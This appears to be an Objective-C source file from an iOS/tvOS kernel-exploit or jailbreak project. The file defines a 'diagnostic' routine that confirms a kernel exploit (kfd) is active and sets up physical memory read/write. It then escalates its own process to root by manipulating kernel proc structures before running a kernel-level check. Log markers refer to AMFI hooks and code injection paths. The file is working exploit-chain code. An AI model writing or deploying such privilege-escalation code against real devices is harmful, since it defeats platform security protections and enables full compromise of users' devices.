#import "dt_build697_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt697_log_fn)(NSString *line);

static void dt697_log(dt697_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt697_emit(dt697_log_fn log, NSString *marker)
{
    dt697_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build697_run_b4file_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    dt697_emit(log, @"KCALL697_UI_TAP");
    dt697_emit(log, @"KCALL696_NO_WALL2");
    dt697_emit(log, @"KCALL696_NO_OPAINJECT");
    dt697_emit(log, @"KCALL696_NO_AMFI_HOOK");
    dt697_emit(log, @"KCALL696_NO_USERREBOOT");
    dt697_emit(log, @"KCALL697_DIAGNOSTIC_ONLY");
    dt697_emit(log, @"KCALL697_LOCAL_DLOPEN_NOT_LAUNCHD_EQUIVALENT");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL697_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL697_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt697_log(log, @"[+] build697 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL697_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL697_BUILD97_FAIL";
        return -4;
    }

    NSString *kernelVerdict = nil;
    int r = dt697_run_b4file_diagnostic(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"BUILD102697_DIAGNOSTIC_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"BUILD102697_DIAGNOSTIC_PASS";
    dt697_emit(log, @"KCALL697_PHASE_PASS");
    return 0;
}
